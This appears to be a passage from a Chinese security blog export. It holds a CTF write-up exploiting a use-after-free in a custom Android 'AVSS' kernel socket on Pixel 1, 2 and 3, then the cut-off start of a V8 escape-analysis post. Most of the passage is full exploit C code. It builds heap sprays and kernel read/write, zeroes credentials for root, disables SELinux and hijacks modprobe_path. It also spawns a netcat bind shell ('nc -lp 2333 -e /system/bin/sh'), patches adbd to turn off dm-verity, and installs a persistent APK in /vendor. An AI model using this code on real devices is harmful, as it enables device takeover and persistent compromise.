perror(&quot;bind failed&quot;);        close(sockfd);        return -1;    &#125;    return sockfd;&#125;int client_connect(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (connect(sockfd,(struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;       perror(&quot;connect failed&quot;);       close(sockfd);       return -1;    &#125;    return sockfd;&#125;char payload[0x1000];int client_thread_finished = 0;void *client_thread(void *arg) &#123;   size_t serverfd = (size_t)arg;   struct avss_data data;   int client_fd = client_connect(2023,1);   memset(&amp;data, 0, sizeof(data));   data.score = 85;  // 示例得分   strcpy(data.buff, &quot;Hello from client!&quot;);   if (send(client_fd, &amp;data, sizeof(data),0) &lt; 0) &#123;       perror(&quot;sendto failed&quot;);       close(client_fd);       return NULL;   &#125;   printf(&quot;Message sent to server.\\n&quot;);   usleep(500000);   //UAF   close(serverfd);   usleep(500000);   //setxattr(&quot;/tmp&quot;, &quot;ha1vk&quot;, payload, 0x360, 0);   if (setxattr(&quot;/data/local/tmp&quot;, &quot;ha1vk&quot;, payload, 0x360, 0)) &#123;      perror(&quot;setxattr&quot;);   &#125;   sleep(5);   client_thread_finished = 1;   return NULL;&#125;int read_at_address_pipe(void* address, void* buf, ssize_t len) &#123;    int ret = 1;    int pipes[2];    if(pipe(pipes))    return 1;    if(write(pipes[1], address, len) != len)        goto end;    if(read(pipes[0], buf, len) != len)        goto end;    ret = 0;end:    close(pipes[1]);    close(pipes[0]);    return ret;&#125;int write_at_address_pipe(void* address, void* buf, ssize_t len) &#123;    int ret = 1;    int pipes[2];    if(pipe(pipes))    return 1;    if(write(pipes[1], buf, len) != len)        goto end;    if(read(pipes[0], address, len) != len)        goto end;    ret = 0;end:    close(pipes[1]);    close(pipes[0]);    return ret;&#125;size_t read_qword(size_t addr) &#123;   size_t val = 0;   if (read_at_address_pipe((void *)addr,&amp;val,8)) &#123;      printf(&quot;read qword error\\n&quot;);      exit(-1);   &#125;   return val;&#125;uint32_t read_dword(size_t addr) &#123;   uint32_t val = 0;   if (read_at_address_pipe((void *)addr,&amp;val,4)) &#123;      printf(&quot;read dword error\\n&quot;);      exit(-1);   &#125;   return val;&#125;void write_dword(size_t addr,uint32_t val) &#123;   if (write_at_address_pipe((void *)addr,&amp;val,4)) &#123;      printf(&quot;read qword error\\n&quot;);      exit(-1);   &#125;&#125;void write_qword(size_t addr,size_t val) &#123;   if (write_at_address_pipe((void *)addr,&amp;val,8)) &#123;      printf(&quot;read qword error\\n&quot;);      exit(-1);   &#125;&#125;size_t get_current_task() &#123;    size_t task = INIT_TASK;    size_t result = 0;    int i = 0;    int pid;    int current_task_pid = getpid();    while(result == 0 &amp;&amp; i++ &lt; 1000) &#123;        task = read_qword(task + TASK_OFFSET) - TASK_OFFSET;        printf(&quot;task: %#lx\\n&quot;, task);        if(task == INIT_TASK) &#123;            break;        &#125;        pid = read_dword(task + PID_OFFSET);        printf(&quot;pid: %d\\n&quot;, pid);        if(pid == current_task_pid) &#123;            result = task;        &#125;    &#125;    return result;&#125;int main() &#123;    size_t serverfd;    struct avss_addr addr;    uint64_t score;    uint64_t x = 0;    pthread_t client_th;    cpu_set_t mask;    CPU_ZERO(&amp;mask);    CPU_SET(1,&amp;mask);    if(sched_setaffinity(0,sizeof(mask),&amp;mask)== -1) &#123;       perror(&quot;sched setaffinity&quot;);       return -1;    &#125;   memset(payload,&#x27;a&#x27;,0x1000);   /*my custom kernel   *(int *)(&amp;payload[0x114]) = 1;   *(int *)(&amp;payload[0x64]) = 1;   *(size_t *)(&amp;payload[0x28]) = ksymtab___sk_backlog_rcv - 0x68;   //gadget   *(size_t *)(&amp;payload[0x290]) = kernel_setsockopt;   //return to userspace   *(size_t *)(&amp;payload[0x288]) = add_sp_40_ret;*/   //pixel 1 kernel   *(int *)(&amp;payload[0x11C]) = 1;   *(int *)(&amp;payload[0x6C]) = 1;   *(size_t *)(&amp;payload[0x28]) = ksymtab___sk_backlog_rcv - 0x68;   //gadget   *(size_t *)(&amp;payload[0x2b0]) = kernel_setsockopt;   *(size_t *)(&amp;payload[0x100]) = 0x8000;   //return to userspace   *(size_t *)(&amp;payload[0x2a8]) = add_sp_40_ret;    serverfd = create_server(2023,1);    if (pthread_create(&amp;client_th, NULL, client_thread, (void *)serverfd) != 0) &#123;        perror(&quot;Failed to create client thread&quot;);        return 1;    &#125;    while (!client_thread_finished) &#123;       score = 0;       if (syscall(281, serverfd, &amp;score) &lt;0) &#123;          //printf(&quot;syscall error\\n&quot;);       &#125;       //printf(&quot;score=%d,x=%d\\n&quot;,score,x);    &#125;    //close(serverfd);    printf(&quot;bypass PXN done\\n&quot;);    size_t current_task = get_current_task();    printf(&quot;current_task_addr=0x%lx\\n&quot;,current_task);    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET);    printf(&quot;current_cred: 0x%lx\\n&quot;, current_cred);    for(int i = 0; i &lt; 4; i ++) &#123;        write_qword(current_cred + 4 + i * 8, 0);    &#125;    write_dword(selinux_enforcing, 0);    system(&quot;/system/bin/sh&quot;);    return 0;&#125;\n\n提权后，可以通过以下命令将一个app安装到系统中实现持久化\n./busybox mount -o remount,rw /vendormkdir /vendor/app/Polariscp polaris.apk /vendor/app/Polarisreboot\n\n重启后即可见效果\nAndroid 8 - Pixel 2UAF的制造与Android 7有点不一样，这次UAF，我们使用一个新的AVSS socket去占位，经过sys_avss_getscore尾部的sock_put时，这个新的AVSS socket引用计数会减1。为了让这个新的AVSS socket也成为UAF状态，我们使用的是client，而不是server，因为server的引用为3，而client的引用为2（create时为1，connect时为2）。这个client经过sys_avss_getscore尾部的sock_put后，引用为1。此时对server进行close，client的引用为0，被free掉了。但是client的文件描述符可以继续操作，这就使得client成为了一个UAF的sock对象。\n通过伪造parse指针为读写的gadget，可以实现任意地址读写。\n\n\n同时需要伪造一下selinux用到的指针，因为bind时会经过selinux来到这个函数，只需要伪造任意的一个地址，满足*(int *)addr &#x3D;&#x3D; 1，即可绕过。\n\n\n通过任意地址读写，改写selinux_enforcing为0，关闭selinux，然后搜索cred结构体并改写uid等字段提权。\n#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;netinet/in.h&gt;#include &lt;linux/socket.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/msg.h&gt;#include &lt;linux/keyctl.h&gt;#include &lt;sched.h&gt;#define AF_AVSS 1024#define AVSS_PORT 2024size_t kernel_base;size_t gadget_leak;size_t gadget_write;size_t init_task;//pixel 2 kernel#define TASK_OFFSET 0x440#define PID_OFFSET 0x538#define PTR_CRED_OFFSET 0x6E8struct avss_addr &#123;    sa_family_t avss_family;    uint16_t year;    uint32_t id;&#125; __attribute__((packed));struct avss_data &#123;    uint8_t score;    char buff[128];&#125; __attribute__((packed));int create_server(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (bind(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;        perror(&quot;bind failed&quot;);        close(sockfd);        return -1;    &#125;    return sockfd;&#125;int client_connect(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (connect(sockfd,(struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;       perror(&quot;connect failed&quot;);       close(sockfd);       return -1;    &#125;    return sockfd;&#125;char payload[0x1000];int client_thread_finished = 0;void spray_addkey(int count) &#123;    int i;    char desc[0x400];    for (i = 0; i &lt; count; i++) &#123;        memset(desc, &#x27;b&#x27;, 0x300);        desc[0x300] = 0;        syscall(__NR_add_key, &quot;user&quot;, desc, payload, 0x400, KEY_SPEC_PROCESS_KEYRING);    &#125;&#125;int newserverfd;int newclient_fd;void *client_thread(void *arg) &#123;   size_t serverfd = (size_t)arg;   struct avss_data data;   int client_fd = client_connect(2023,1);   memset(&amp;data, 0, sizeof(data));   data.score = 85;  // 示例得分   strcpy(data.buff, &quot;Hello from client!&quot;);   if (send(client_fd, &amp;data, sizeof(data),0) &lt; 0) &#123;       perror(&quot;sendto failed&quot;);       close(client_fd);       return NULL;   &#125;   printf(&quot;Message sent to server.\\n&quot;);   usleep(100000);   //UAF   close(serverfd);   usleep(500000);   //使用一个任意文件占位原来的serverfd描述符，但是不能用avss_socket去，不然sk指针会重新获取   open(&quot;/dev/null&quot;,0);   //使用newclient的sock结构体去占位，经过getscore中的sk_free时，newclient的引用将减1但没释放   newclient_fd = client_connect(2023,2);   close(serverfd);   //关闭newclient的一个引用，由于之前减了1，这次关闭引用后，newclient的引用为0将被释放   close(newserverfd);   sleep(5);   close(client_fd);   client_thread_finished = 1;   return NULL;&#125;ssize_t syscall_send(int sockfd, const void *buf, size_t len, int flags) &#123;    ssize_t ret;    asm volatile (        &quot;mov x8, %1\\n&quot;        &quot;mov x0, %2\\n&quot;        &quot;mov x1, %3\\n&quot;        &quot;mov x2, %4\\n&quot;        &quot;mov x3, %5\\n&quot;        &quot;mov x4, #0\\n&quot;        &quot;mov x5, #0\\n&quot;        &quot;svc #0\\n&quot;        &quot;mov %0, x0\\n&quot;        : &quot;=r&quot; (ret)        : &quot;r&quot; (SYS_sendto), &quot;r&quot; (sockfd), &quot;r&quot; (buf), &quot;r&quot; (len), &quot;r&quot; (flags)  // 输入寄存器        : &quot;x0&quot;, &quot;x1&quot;, &quot;x2&quot;, &quot;x3&quot;, &quot;x4&quot;, &quot;x5&quot;, &quot;x8&quot; // clobbered 寄存器    );    return ret;&#125;int client_trigger;uint32_t read_dword(size_t addr) &#123;    struct avss_addr sk_addr;    memset(payload, 0, 0x360);    *(size_t *)(&amp;payload[0x180]) = addr - 0x58;    // sock_has_perm    *(size_t *)(&amp;payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct    *(size_t *)(&amp;payload[0x2c8]) = 2023;        // year    *(size_t *)(&amp;payload[0x2cc]) = 5;           // id    payload[0x2d0] = 1;                         // score    *(size_t *)(&amp;payload[0x2e0]) = gadget_leak; // parse    spray_addkey(100);    memset(&amp;sk_addr, 0, sizeof(sk_addr));    sk_addr.avss_family = AF_AVSS;    sk_addr.year = 2023;    sk_addr.id = 5;    if (connect(client_trigger, (struct sockaddr *)&amp;sk_addr, sizeof(sk_addr)) &lt; 0) &#123;        perror(&quot;client trigger connect failed&quot;);        return -1;    &#125;    uint32_t x = (uint32_t)syscall_send(client_trigger, &quot;aaaa&quot;, 4, 0);    close(client_trigger);    client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);    if (client_trigger &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    return x;&#125;size_t read_qword(size_t addr) &#123;   uint32_t low = read_dword(addr);   uint32_t high = read_dword(addr + 4);   size_t val = low + ((size_t)high &lt;&lt; 32);   return val;&#125;int write_qword(size_t addr,size_t val) &#123;    struct avss_addr sk_addr;    memset(payload, 0, 0x360);    *(size_t *)(&amp;payload[0x20]) = addr - 0x68;    // sock_has_perm    *(size_t *)(&amp;payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct    *(size_t *)(&amp;payload[0x2c8]) = 2023;        // year    *(size_t *)(&amp;payload[0x2cc]) = 5;           // id    payload[0x2d0] = 1;                         // score    *(size_t *)(&amp;payload[0x2e0]) = gadget_write; // parse    spray_addkey(100);    memset(&amp;sk_addr, 0, sizeof(sk_addr));    sk_addr.avss_family = AF_AVSS;    sk_addr.year = 2023;    sk_addr.id = 5;    if (connect(client_trigger, (struct sockaddr *)&amp;sk_addr, sizeof(sk_addr)) &lt; 0) &#123;        perror(&quot;client trigger connect failed&quot;);        return -1;    &#125;    uint32_t x = (uint32_t)syscall_send(client_trigger, &quot;ha1vk&quot;, val, 0);    close(client_trigger);    client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);    if (client_trigger &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    return x;&#125;size_t get_current_task() &#123;    size_t task = init_task;    size_t result = 0;    int i = 0;    int pid;    int current_task_pid = getpid();    while(result == 0 &amp;&amp; i++ &lt; 1000) &#123;        task = read_qword(task + TASK_OFFSET) - TASK_OFFSET;        printf(&quot;task: %#lx\\n&quot;, task);        if(task == init_task) &#123;            break;        &#125;        pid = read_dword(task + PID_OFFSET);        printf(&quot;pid: %d\\n&quot;, pid);        if(pid == current_task_pid) &#123;            result = task;        &#125;    &#125;    return result;&#125;int main() &#123;    size_t serverfd;    struct avss_addr addr;    uint64_t score;    uint64_t x = 0;    pthread_t client_th;    //全部分配到一个CPU上执行，否则很难堆喷成功    cpu_set_t mask;    CPU_ZERO(&amp;mask);    CPU_SET(1, &amp;mask);    if (sched_setaffinity(0, sizeof(mask), &amp;mask) == -1) &#123;        perror(&quot;sched setaffinity&quot;);        return -1;    &#125;    memset(payload, 0, 0x1000);    serverfd = create_server(2023, 1);    newserverfd = create_server(2023, 2);        client_trigger = socket(AF_AVSS, SOCK_DGRAM, 0);    if (client_trigger &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    if (pthread_create(&amp;client_th, NULL, client_thread, (void *)serverfd) != 0) &#123;        perror(&quot;Failed to create client thread&quot;);        return 1;    &#125;    while (!client_thread_finished) &#123;        score = 0;        if (syscall(285, serverfd, &amp;score) &lt; 0) &#123;            // printf(&quot;syscall error\\n&quot;);        &#125;    &#125;    // now newclient_fd is UAF    printf(&quot;start leaking kernel base(wait a few minutes)...\\n&quot;);    *(uint16_t *)&amp;payload[0x10] = 0x400;    *(uint32_t *)&amp;payload[0x2C8] = 2023; //year    *(uint32_t *)&amp;payload[0x2CC] = 4; //iod    payload[0x2D0] = 100; //score    *(uint64_t *)&amp;payload[0x2D8] = 0; //peer    *(uint64_t *)&amp;payload[0x2E0] = 0xFFFFFF80090D7E34; //avss_default_parse    while (1) &#123;       *(uint64_t *)&amp;payload[0x2E0] += 0x100000;       spray_addkey(100);       if (syscall(285, newclient_fd, &amp;score) == 0) &#123;          printf(&quot;found kernel address\\n&quot;);          break;       &#125;    &#125;    kernel_base = *(uint64_t *)&amp;payload[0x2E0] - 0x1057e34;    //kernel_base = 0xffffff8d6a480000;    printf(&quot;kernel_base=0x%lx\\n&quot;, kernel_base);    init_task = kernel_base + 0x254d750;    // 0xffffff800869a73c : ldr x0, [x0, #0x180] ; ldr x0, [x0, #0x58] ; ret    gadget_leak = kernel_base + 0x61a73c;    //0xffffff80088e4dd0 : ldr x1, [x0, #0x20] ; str x2, [x1, #0x68] ; ldrb w1, [x0, #0x35] ; orr w1, w1, #4 ; strb w1, [x0, #0x35] ; ret    gadget_write = kernel_base + 0x864dd0;    size_t selinux_enforcing = kernel_base + 0x285fa4c;    // 伪造sock结构体    memset(payload, 0, 0x360);    // 绕过selinux函数sock_has_perm的检查    *(size_t *)(&amp;payload[0x270]) = kernel_base + 0x12512f8; // fake a sk_security_struct    spray_addkey(100);    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = 2023;    addr.id = 5;    if (bind(newclient_fd, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;        perror(&quot;bind failed&quot;);        return -1;    &#125;    size_t current_task = get_current_task();    printf(&quot;current_task_addr=0x%lx\\n&quot;,current_task);    size_t current_cred = read_qword(current_task + PTR_CRED_OFFSET);    printf(&quot;current_cred: 0x%lx\\n&quot;, current_cred);    for(int i = 0; i &lt; 4; i ++) &#123;        write_qword(current_cred + 4 + i * 8, 0);    &#125;    write_qword(selinux_enforcing-4,0xffffffff00000000);    memset(payload, 0, 0x400);    //设置sk的引用，避免最后程序退出时关闭文件描述符时释放这个UAF的sk造成系统崩溃    *(size_t *)(&amp;payload[0x80]) = 0xff;    *(size_t *)(&amp;payload[0x120]) = 0xff;    spray_addkey(100);        system(&quot;/system/bin/sh&quot;);    return 0;&#125;\n\n由于设备的分区开了保护，通过分析adb发现adb可以关闭保护adb disable-verity，但是需要adbd具有root权限。分析adbd，我们从系统中提取adbd程序，然后对adbd进行patch，让其主函数直接调用set_verity_enabled_state_service(1, 0LL)关闭分区保护\n\n\n我们把这个修改过的adbd程序命名为disable-dm-verity，在我们获得的root shell中调用后重启，即可关闭分区保护。全部命令如下\n./disable-dm-verityreboot./busybox mount -o remount,rw /vendormkdir /vendor/app/Polariscp polaris.apk /vendor/app/Polarisreboot\n\n重启后即可见效果\nAndroid 9 - Pixel 3内核开启了CFI保护，导致劫持函数指针的思路基本不可行。\n\n\n分析avss_release函数发现链表unlink的操作，这可以被利用起来做任意地址写。\n\n\n由于两个数据都必须为合法的内存指针，因此不能直接写数据。但是可以用错位的思路，CPU为小端，因此指针的最低一个字节存放在最前面，我们每次只需要保证指针的最低一个字节被写入到目标地址即可。令*(v3 + 112) &#x3D; addr,\n*(v3 + 104) &#x3D; bss | byte，则可以在addr处写上一个字节byte。其中bss为bss的地址，用于保证两个数据都为合法的内存指针不会崩溃。writeByte的原语如下\nvoid writeByte(size_t addr,int byte) &#123;    size_t serverfd;    pthread_t client_th;    uint64_t score;    memset(payload, 0, 0x1000);    client_thread_finished = 0;    serverfd = create_server(2023, 1);    newserverfd = create_server(2023, 2);    if (pthread_create(&amp;client_th, NULL, client_thread, (void *)serverfd) != 0) &#123;        perror(&quot;Failed to create client thread&quot;);        return;    &#125;    while (!client_thread_finished) &#123;        score = 0;        if (syscall(291, serverfd, &amp;score) &lt; 0) &#123;            // printf(&quot;syscall error\\n&quot;);        &#125;    &#125;    spray_pipe(1);    *(uint64_t *)&amp;payload[0x80] = 0x2;    *(uint64_t *)&amp;payload[0x2c8] = selinux_enforcing - 0x2c8;    *(uint64_t *)&amp;payload[0x2b8] = 1;    *(uint64_t *)&amp;payload[0x68] = bss | byte;    *(uint64_t *)&amp;payload[0x70] = addr;    setxattr(&quot;/data/local/tmp&quot;, &quot;ha1vk&quot;, payload, 0x400, 0);    close(newclient_fd);    for (int i=3;i&lt;12;i++) &#123;        close(i);    &#125;    //getchar();&#125;\n\n通过writeByte改写selinux_enforcing为0关闭selinux，改写modprobe_path为提权脚本。然后触发modprobe_path的执行。在脚本中我们用nc监听了一个端口并启动root shell。\n#define _GNU_SOURCE#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/xattr.h&gt;#include &lt;netinet/in.h&gt;#include &lt;linux/socket.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/msg.h&gt;#include &lt;linux/keyctl.h&gt;#include &lt;sched.h&gt;#include &lt;sys/mman.h&gt;#define AF_AVSS 1024#define AVSS_PORT 2024size_t kernel_base;size_t selinux_enforcing;size_t modprobe_path;size_t bss;struct avss_addr &#123;    sa_family_t avss_family;    uint16_t year;    uint32_t id;&#125; __attribute__((packed));struct avss_data &#123;    uint8_t score;    char buff[128];&#125; __attribute__((packed));int create_server(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (bind(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;        perror(&quot;bind failed&quot;);        close(sockfd);        return -1;    &#125;    return sockfd;&#125;int client_connect(int year,int id) &#123;    int sockfd;    struct avss_addr addr;    sockfd = socket(AF_AVSS, SOCK_DGRAM, 0);    if (sockfd &lt; 0) &#123;        perror(&quot;socket failed&quot;);        return -1;    &#125;    memset(&amp;addr, 0, sizeof(addr));    addr.avss_family = AF_AVSS;    addr.year = year;    addr.id = id;    if (connect(sockfd,(struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0) &#123;       perror(&quot;connect failed&quot;);       close(sockfd);       return -1;    &#125;    return sockfd;&#125;char payload[0x1000];int client_thread_finished = 0;void spray_addkey(int count) &#123;    int i;    char desc[0x400];    for (i = 0; i &lt; count; i++) &#123;        memset(desc, &#x27;b&#x27;, 0x300);        desc[0x300] = 0;        syscall(__NR_add_key, &quot;user&quot;, desc, payload, 0x400, KEY_SPEC_PROCESS_KEYRING);    &#125;&#125;int newserverfd;int newclient_fd;void *client_thread(void *arg) &#123;   size_t serverfd = (size_t)arg;   struct avss_data data;   int client_fd = client_connect(2023,1);   memset(&amp;data, 0, sizeof(data));   data.score = 85;  // 示例得分   strcpy(data.buff, &quot;Hello from client!&quot;);   if (send(client_fd, &amp;data, sizeof(data),0) &lt; 0) &#123;       perror(&quot;sendto failed&quot;);       close(client_fd);       return NULL;   &#125;   printf(&quot;Message sent to server.\\n&quot;);   usleep(100000);   //UAF   close(serverfd);   usleep(500000);   //使用一个任意文件占位原来的serverfd描述符，但是不能用avss_socket去，不然sk指针会重新获取   open(&quot;/dev/null&quot;,0);   //使用newclient的sock结构体去占位，经过getscore中的sk_free时，newclient的引用将减1但没释放   newclient_fd = client_connect(2023,2);   close(serverfd);   //关闭newclient的一个引用，由于之前减了1，这次关闭引用后，newclient的引用为0将被释放   close(newserverfd);   sleep(3);   close(client_fd);   client_thread_finished = 1;   return NULL;&#125;ssize_t syscall_send(int sockfd, const void *buf, size_t len, int flags) &#123;    ssize_t ret;    asm volatile (        &quot;mov x8, %1\\n&quot;        &quot;mov x0, %2\\n&quot;        &quot;mov x1, %3\\n&quot;        &quot;mov x2, %4\\n&quot;        &quot;mov x3, %5\\n&quot;        &quot;mov x4, #0\\n&quot;        &quot;mov x5, #0\\n&quot;        &quot;svc #0\\n&quot;        &quot;mov %0, x0\\n&quot;        : &quot;=r&quot; (ret)        : &quot;r&quot; (SYS_sendto), &quot;r&quot; (sockfd), &quot;r&quot; (buf), &quot;r&quot; (len), &quot;r&quot; (flags)  // 输入寄存器        : &quot;x0&quot;, &quot;x1&quot;, &quot;x2&quot;, &quot;x3&quot;, &quot;x4&quot;, &quot;x5&quot;, &quot;x8&quot; // clobbered 寄存器    );    return ret;&#125;#define NUM_PIPE 100int pipefd[NUM_PIPE][2];void spray_pipe(int n) &#123;    for (int i=0;i&lt;n;i++) &#123;        pipe(pipefd[i]);    &#125;&#125;void writeByte(size_t addr,int byte) &#123;    size_t serverfd;    pthread_t client_th;    uint64_t score;    memset(payload, 0, 0x1000);    client_thread_finished = 0;    serverfd = create_server(2023, 1);    newserverfd = create_server(2023, 2);    if (pthread_create(&amp;client_th, NULL, client_thread, (void *)serverfd) != 0) &#123;        perror(&quot;Failed to create client thread&quot;);        return;    &#125;    while (!client_thread_finished) &#123;        score = 0;        if (syscall(291, serverfd, &amp;score) &lt; 0) &#123;            // printf(&quot;syscall error\\n&quot;);        &#125;    &#125;    spray_pipe(1);    *(uint64_t *)&amp;payload[0x80] = 0x2;    *(uint64_t *)&amp;payload[0x2c8] = selinux_enforcing - 0x2c8;    *(uint64_t *)&amp;payload[0x2b8] = 1;    *(uint64_t *)&amp;payload[0x68] = bss | byte;    *(uint64_t *)&amp;payload[0x70] = addr;    setxattr(&quot;/data/local/tmp&quot;, &quot;ha1vk&quot;, payload, 0x400, 0);    close(newclient_fd);    for (int i=3;i&lt;12;i++) &#123;        close(i);    &#125;    //getchar();&#125;void setup_rootscript() &#123;    system(&quot;echo &#x27;#!/system/bin/sh&#x27; &gt; /data/local/tmp/g&quot;);    system(&quot;echo &#x27;/data/local/tmp/busybox nc -lp 2333 -e /system/bin/sh&#x27; &gt;&gt; /data/local/tmp/g&quot;);    system(&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt;&gt; /data/local/tmp/x&quot;);    system(&quot;chmod +x /data/local/tmp/busybox /data/local/tmp/x /data/local/tmp/g&quot;);    int test = popen(&quot;/data/local/tmp/g&quot;,&quot;r&quot;);    close(test);&#125;int main() &#123;    size_t serverfd;    struct avss_addr addr;    uint64_t score;    uint64_t x = 0;    pthread_t client_th;    //全部分配到一个CPU上执行，否则很难堆喷成功    cpu_set_t mask;    CPU_ZERO(&amp;mask);    CPU_SET(1, &amp;mask);    if (sched_setaffinity(0, sizeof(mask), &amp;mask) == -1) &#123;        perror(&quot;sched setaffinity&quot;);        return -1;    &#125;    setup_rootscript();    memset(payload, 0, 0x1000);    serverfd = create_server(2023, 1);    newserverfd = create_server(2023, 2);    if (pthread_create(&amp;client_th, NULL, client_thread, (void *)serverfd) != 0) &#123;        perror(&quot;Failed to create client thread&quot;);        return 1;    &#125;    while (!client_thread_finished) &#123;        score = 0;        if (syscall(291, serverfd, &amp;score) &lt; 0) &#123;            // printf(&quot;syscall error\\n&quot;);        &#125;    &#125;    // now newclient_fd is UAF    printf(&quot;start leaking kernel base(wait a few minutes)...\\n&quot;);    *(uint16_t *)&amp;payload[0x10] = 0x400;    *(uint32_t *)&amp;payload[0x2B8] = 2023; //year    *(uint32_t *)&amp;payload[0x2BC] = 4; //id    payload[0x2C0] = 100; //score    *(uint64_t *)&amp;payload[0x2C8] = 0; //peer    *(uint64_t *)&amp;payload[0x2D0] = 0xFFFFFF8009934470; //avss_default_parse    while (1) &#123;       *(uint64_t *)&amp;payload[0x2D0] += 0x100000;       spray_addkey(100);       if (syscall(291, newclient_fd, &amp;score) == 0) &#123;          printf(&quot;found kernel address\\n&quot;);          break;       &#125;    &#125;    //关闭全部描述符    for (int i=3;i&lt;12;i++) &#123;        close(i);    &#125;    kernel_base = *(uint64_t *)&amp;payload[0x2D0] - 0x18b4470;    //kernel_base = 0xffffff827c280000;    selinux_enforcing = kernel_base + 0x2de9000;    modprobe_path = kernel_base + 0x2bafa80;    bss = kernel_base + 0x2deb000;    printf(&quot;kernel_base=0x%lx\\n&quot;, kernel_base);    char *root_script = &quot;/data/local/tmp/g&quot;;    int len = strlen(root_script) + 1;    for (int i=0;i&lt;len;i++) &#123;        printf(&quot;\\rProgress: %d%% &quot;, i * 100 / len);        writeByte(modprobe_path+i,root_script[i]);    &#125;    printf(&quot;\\ntrigger shell...\\n&quot;);    system(&quot;ps -e  | grep busybox | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;);    system(&quot;/data/local/tmp/x &amp;&quot;);    sleep(1);    printf(&quot;your shell is here:\\n&quot;);    system(&quot;/data/local/tmp/busybox nc 127.0.0.1 2333&quot;);    return 0;&#125;\n\n启动的shell虽然id看到是root，但是selinux的context为u:r:kernel:s0，这会导致仍然不能进行某些操作\n\n\n可以通过在root shell中继续执行runcon u:r:su:s0 /system/bin/sh切换selinux的context获得最高的权限。\n\n\n然后使用如下命令持久化一个app，其中disable-dm-verity9是从该设备中提取的adbd进行patch后得到的程序。\n./disable-dm-verity9reboot./busybox mount -o remount,rw /vendormkdir /vendor/app/Polariscp polaris.apk /vendor/app/Polarisreboot\n\n","categories":["CTF","安全研究"],"tags":["android","aarch64","selinux","Linux Kernel"]},{"title":"V8逃逸分析(escape-analysis)——N1CTF2020 Escape","url":"/2020/12/04/N1CTF2020-Escape/","content":"文章首发于安全KER https://www.anquanke.com/post/id/224317\n0x00 前言通过N1CTF2020 Escape一题学习V8的逃逸分析机制\n0x01 前置知识逃逸分析概念逃逸分析(escape-analysis)就是JIT阶段用来分析对象的作用域的一种机制，分析对象的作用域是为了更好的优化代码，生成高效率的JIT代码。如下的代码中，对象a发生了逃逸，因为a是在函数中创建的对象，通过return返回给外部使用。\nfunction func() &#123;\tvar a = [];\treturn a;&#125;func();\n如下的代码也同样发生逃逸\nvar a;function func() &#123;\ta = [];&#125;func();\n逃逸的对象不会在函数执行完毕不会被收回，因此JIT对此类对象不做优化。\n优化未逃逸的对象如果对象未发生逃逸，JIT会将其优化为局部变量的形式，如下的代码中,v未发生逃逸\nfunction func(a) &#123;   let v = &#123;x:a,y:a&#125;;   return v.x+v.y;&#125; \n那么该函数会被优化为\nfunction func(a) &#123;   return a+a;&#125; \n从中可用看出，逃逸分析可以优化那些未逃逸的对象，去掉不必要的对象申请，使得代码更加高效。\n构造一个逃逸如下，将另一个函数作为一个参数，并在当前这个函数里调用另一个函数，JIT将无法在编译时确定foo会做什么，由此，o会发生逃逸\nfunction (foo) &#123;\tlet o = &#123;&#125;;\tfoo(o);&#125;\nJIT逃逸分析如何确定变量类型\nIn a CFG: One map per basic block, updated imperatively when traversing theblock\n\n\nIn an unscheduled graph: One map per effectful node.This is expensive! Solution: A purely functional map:\nCopy: O(1)\nUpdate&#x2F;Access: O(log n)This can be achieved with any tree-based map datastructure.We chose a hash-tree.\n\n从Escape Analysis in V8文献中可以看出，在逃逸分析时，使用树结构来保存各个节点的checkmap，这样进行复制时，只需要O(1)的时间，进行状态更新和访问时，只需要O(log 